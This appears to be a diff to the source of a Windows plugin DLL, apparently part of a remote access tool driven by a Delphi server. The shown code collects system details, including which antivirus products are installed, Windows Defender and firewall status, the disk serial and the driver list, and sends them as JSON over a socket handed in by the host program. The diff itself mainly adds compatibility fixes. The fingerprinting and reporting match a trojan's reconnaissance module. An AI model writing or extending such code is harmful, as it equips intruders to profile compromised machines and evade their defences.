@@ -1,3 +1,6 @@
+#ifndef _WIN32_WINNT
+#define _WIN32_WINNT 0x0600
+#endif
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <winsock2.h>
@@ -26,8 +29,15 @@ using namespace std;
 string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
     char data[512];
     DWORD dataSize = sizeof(data);
-    if (RegGetValueA(hKeyRoot, subKey, valueName, RRF_RT_REG_SZ, NULL, data, &dataSize) == ERROR_SUCCESS)
-        return string(data);
+    // Use RegOpenKeyEx and RegQueryValueEx for better compatibility with older headers if RegGetValueA is missing
+    HKEY hKey;
+    if (RegOpenKeyExA(hKeyRoot, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        if (RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)data, &dataSize) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return string(data);
+        }
+        RegCloseKey(hKey);
+    }
     return "N/A";
 }
 
@@ -45,6 +55,7 @@ string getMacAddress() {
 }
 
 string getUptime() {
+    // GetTickCount64 is available from Vista onwards.
     ULONGLONG ticks = GetTickCount64();
     int seconds = (int)(ticks / 1000);
     int minutes = seconds / 60;
@@ -68,7 +79,6 @@ string getGPUName() {
 
 string getUSBCount() {
     int count = 0;
-    // Using GUID_DEVCLASS_USB to count USB controllers/hubs or devices
     HDEVINFO hDevInfo = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
     if (hDevInfo != INVALID_HANDLE_VALUE) {
         SP_DEVINFO_DATA devInfoData;
@@ -92,7 +102,6 @@ string getMachineType() {
 
 string getAntivirus() {
     string av = "None";
-    // Check for Windows Defender specifically via Registry
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         DWORD disable = 0;
@@ -106,7 +115,6 @@ string getAntivirus() {
         RegCloseKey(hKey);
     }
 
-    // Fallback or addition: Check common installation paths
     const char* paths[] = {
         "C:\\Program Files\\Avast Software\\Avast\\AvastUI.exe",
         "C:\\Program Files (x86)\\AVG\\Antivirus\\avgui.exe",
@@ -129,7 +137,6 @@ string getAntivirus() {
 string getFirewall() {
     string fw = "Unknown";
     HKEY hKey;
-    // Check Domain Profile
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         DWORD enable = 0;
         DWORD size = sizeof(DWORD);
@@ -139,7 +146,6 @@ string getFirewall() {
         }
         RegCloseKey(hKey);
     }
-    // If unknown or disabled, check Standard Profile
     if (fw == "Unknown" || fw == "Windows Firewall (Disabled)") {
         if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             DWORD enable = 0;
@@ -156,7 +162,8 @@ string getFirewall() {
 
 string getLanguage() {
     char lang[256];
-    if (GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SENGDISPLAYNAME, lang, sizeof(lang))) {
+    // LOCALE_SENGLANGUAGE is more widely supported in older headers than LOCALE_SENGDISPLAYNAME
+    if (GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SENGLANGUAGE, lang, sizeof(lang))) {
         return string(lang);
     }
     return "Unknown";
@@ -208,7 +215,6 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     j["process"]            = getProcessName();
     j["datetime"]           = string(date_buf);
 
-    // Drivers
     LPVOID drivers[1024];
     DWORD cbNeeded;
     if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
@@ -216,7 +222,6 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     else
         j["listdrivers"] = "N/A";
 
-    // HDD Serial
     DWORD serial;
     if (GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0))
         j["hddserial"] = to_string(serial);
@@ -227,7 +232,6 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     j["gpu"]                = getGPUName();
     j["cpu"]                = getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString");
 
-    // RAM
     MEMORYSTATUSEX statex;
     statex.dwLength = sizeof(statex);
     if (GlobalMemoryStatusEx(&statex))
@@ -245,7 +249,6 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     j["currentlang"]        = getLanguage();
     j["platform"]           = getPlatform();
 
-    // Battery
     SYSTEM_POWER_STATUS sps;
     if (GetSystemPowerStatus(&sps)) {
         if (sps.BatteryFlag == 128) j["battery"] = "No Battery";
@@ -254,7 +257,6 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
         j["battery"] = "N/A";
     }
 
-    // Geriye Dönüş: Delphi Server düz \r\n JSON bekliyor
     string msg = j.dump() + "\r\n";
     send(sock, msg.c_str(), (int)msg.length(), 0);
 }
